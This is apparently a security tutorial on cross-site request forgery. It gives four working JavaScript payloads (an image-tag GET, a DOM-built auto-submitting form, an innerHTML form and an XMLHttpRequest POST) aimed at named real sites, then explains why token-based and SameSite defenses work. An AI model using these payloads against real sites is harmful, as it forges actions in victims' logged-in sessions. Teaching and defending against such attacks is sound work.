# 06 - CSRF Attack Techniques

## Overview

Cross-Site Request Forgery (CSRF) tricks a victim's browser into making requests to a target site where the victim is already authenticated. The browser automatically attaches cookies, so the server can't distinguish the forged request from a legitimate one.

## Technique 1: GET-Based CSRF via `<img>` Tag

If the target action uses GET (a design flaw), the attack is trivial:

```
http://blog.sohu.com/manage/entry.do?m=delete&id=156713012
```

The attacker injects an image tag — the browser fires the GET request automatically:

```javascript
var img = document.createElement("img");
img.src = "http://blog.sohu.com/manage/entry.do?m=delete&id=156713012";
document.body.appendChild(img);
```

The victim's blog post `156713012` gets deleted. No click required — just loading the page is enough.

## Technique 2: POST-Based CSRF via Hidden Form (DOM API)

When the target requires POST, the attacker creates and auto-submits a form:

```javascript
var f = document.createElement("form");
f.action = "";
f.method = "post";
document.body.appendChild(f);

var i1 = document.createElement("input");
i1.name = "ck";
i1.value = "JiUY";
f.appendChild(i1);

var i2 = document.createElement("input");
i2.name = "mb_text";
i2.value = "testtesttest";
f.appendChild(i2);

f.submit();
```

This programmatically builds a form with the required fields and submits it — the victim's browser sends the POST with their cookies attached.

## Technique 3: POST-Based CSRF via innerHTML

Same result, different approach — inject the form as raw HTML:

```javascript
var dd = document.createElement("div");
document.body.appendChild(dd);
dd.innerHTML = '<form action="" method="post" id="xssform" name="mbform">' +
  '<input type="hidden" value="JiUY" name="ck" />' +
  '<input type="text" value="testtesttest" name="mb_text" />' +
  '</form>';

document.getElementById("xssform").submit();
```

Functionally identical to Technique 2, but uses `innerHTML` to create the form in one shot.

## Technique 4: POST-Based CSRF via XMLHttpRequest

For more control (custom headers, reading the response), use AJAX:

```javascript
var url = "http://www.douban.com";
var postStr = "ck=JiUY&mb_text=test1234";
var ajax = null;

if (window.XMLHttpRequest) {
  ajax = new XMLHttpRequest();
} else if (window.ActiveXObject) {
  ajax = new ActiveXObject("Microsoft.XMLHTTP");
} else {
  return;
}

ajax.open("POST", url, true);
ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajax.send(postStr);

ajax.onreadystatechange = function(){
  if (ajax.readyState == 4 && ajax.status == 200) {
    alert("Done!");
  }
}
```

Note: this only works if the attacker's script is running on the same origin, or if the target has a permissive CORS policy. Otherwise the browser blocks the cross-origin XMLHttpRequest. Techniques 2 and 3 (form submission) don't have this restriction because form submissions are not subject to same-origin policy.

## Comparison

| Technique | Method | Requires Same Origin | Reads Response | User Interaction |
|-----------|--------|---------------------|----------------|-----------------|
| `<img>` tag | GET | No | No | None |
| DOM form | POST | No | No | None |
| innerHTML form | POST | No | No | None |
| XMLHttpRequest | POST | Yes (or CORS) | Yes | None |

## Does the POST Body Content Actually Matter?

Yes — each field serves a purpose:

- `ck` (the CSRF token) is critical. If the server validates it, the attack fails unless the attacker already knows or stole the value. In these examples `ck=JiUY` is assumed leaked or guessed — if the token were strong and secret, the CSRF wouldn't work.
- `mb_text` is the payload — it defines what the forged request does. Could be posting a comment, changing an email, transferring money, etc.
- For GET-based attacks, the content is in the URL itself (`m=delete&id=156713012`) — the attacker just needs to know the right parameter values.

The attacker needs to know the exact parameter names and valid values the server expects. They figure this out by inspecting the target site's forms or API calls in their own browser.

### The Key Insight: CSRF Is Blind

CSRF doesn't let the attacker *read* the response — they can only *send* requests. The POST body has to be correct on the first try. This is exactly why CSRF tokens work as a defense: the attacker can't read the page to get the current token, so they can't construct a valid request.

This also explains why CSRF + XSS is a devastating combo: XSS lets the attacker read the page (and the CSRF token), which completely defeats token-based CSRF protection.

## Defenses

- CSRF tokens — unique per-session token that the attacker can't guess (the `ck=JiUY` in these examples is a weak/leaked token)
- `SameSite` cookie attribute — `Strict` or `Lax` prevents cookies from being sent on cross-site requests
- Check `Referer` / `Origin` headers — reject requests from unexpected origins
- Don't use GET for state-changing operations — GET requests are too easy to forge via `<img>`, `<link>`, etc.
